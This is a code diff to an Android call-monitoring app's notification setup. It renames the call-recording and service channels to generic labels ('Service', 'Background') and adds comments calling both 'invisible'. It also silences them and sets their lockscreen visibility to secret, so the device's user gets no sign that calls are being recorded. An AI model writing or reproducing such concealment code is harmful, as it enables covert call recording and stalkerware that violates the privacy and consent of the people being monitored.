@@ -1,6 +1,7 @@
 package com.callmonitor
 
 import android.app.Application
+import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.os.Build
@@ -27,25 +28,33 @@ class CallMonitorApp : Application(), Configuration.Provider {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val notificationManager = getSystemService(NotificationManager::class.java)
 
-            // Recording channel
+            // Recording channel - invisible
             val recordingChannel = NotificationChannel(
                 CHANNEL_ID_RECORDING,
-                getString(R.string.notification_channel_name),
-                NotificationManager.IMPORTANCE_LOW
+                "Service",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = getString(R.string.notification_channel_description)
+                description = "Background service"
                 setShowBadge(false)
+                setSound(null, null)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             notificationManager.createNotificationChannel(recordingChannel)
 
-            // Service channel
+            // Service channel - invisible
             val serviceChannel = NotificationChannel(
                 CHANNEL_ID_SERVICE,
-                "Call Monitor Service",
+                "Background",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Background service for call monitoring"
+                description = "Background process"
                 setShowBadge(false)
+                setSound(null, null)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             notificationManager.createNotificationChannel(serviceChannel)
         }
